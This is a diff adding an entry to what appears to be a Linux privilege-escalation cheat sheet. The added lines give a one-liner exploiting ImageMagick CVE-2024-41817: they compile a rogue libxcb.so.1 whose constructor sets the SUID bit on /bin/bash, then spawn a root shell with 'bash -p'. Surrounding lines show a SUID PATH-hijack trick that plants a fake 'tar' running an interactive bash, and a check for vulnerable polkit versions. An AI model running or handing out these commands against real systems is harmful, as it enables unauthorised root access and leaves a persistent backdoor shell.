@@ -1384,6 +1384,10 @@ TARGET_SUID=/usr/local/bin/suid-name
 TARGET_BIN=tar
 TEMPFOLDER=$(mktemp -d); printf %s '/bin/bash -i' > $TEMPFOLDER/$TARGET_BIN; chmod +x $TEMPFOLDER/$TARGET_BIN; export PATH=$TEMPFOLDER:$PATH;$TARGET_SUID
 
++---------- Image Magick (CVE-2024-41817) ----------+
+cd /opt/app/static/assets/images/
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - <<< $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) void init(){system("chmod u+s /bin/bash");exit(0);}'; bash -p
+
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
 apt list --installed 2>/dev/null | grep -i policykit
